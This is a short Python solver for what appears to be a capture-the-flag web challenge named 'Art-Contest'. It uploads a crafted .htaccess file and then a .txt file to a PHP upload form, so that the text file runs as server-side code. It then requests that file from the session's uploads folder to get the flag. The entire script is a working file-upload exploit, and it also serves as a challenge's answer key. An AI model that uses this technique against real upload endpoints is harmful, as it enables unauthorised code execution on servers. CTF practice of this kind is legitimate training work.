import os
import requests
import sys


BASE_CHAL_URL = os.getenv('BASE_CHAL_URL') or 'http://localhost:8000/'
if not BASE_CHAL_URL.endswith('/'):
    BASE_CHAL_URL += '/'


session = requests.Session()
response = session.get(BASE_CHAL_URL)
phpsessid = session.cookies.get('PHPSESSID')

with open('.htaccess', 'rb') as htaccess_file:
    files = {'fileToUpload': ('.htaccess', htaccess_file)}
    response = session.post(BASE_CHAL_URL, files=files)

with open('.call_get_flag_in_dir.txt', 'rb') as php_file:
    files = {'fileToUpload': ('.call_get_flag_in_dir.txt', php_file)}
    response = session.post(BASE_CHAL_URL, files=files)

flag_url = f"{BASE_CHAL_URL}uploads/{phpsessid}/.call_get_flag_in_dir.txt"
response = session.get(flag_url)

# Step 5: Extract and print the flag
if 'wctf{' in response.text:
    flag = response.text.strip()
    print("Art-Contest solved!")
else:
    print("Art-Contest solver FAILED!")
    sys.exit(1)
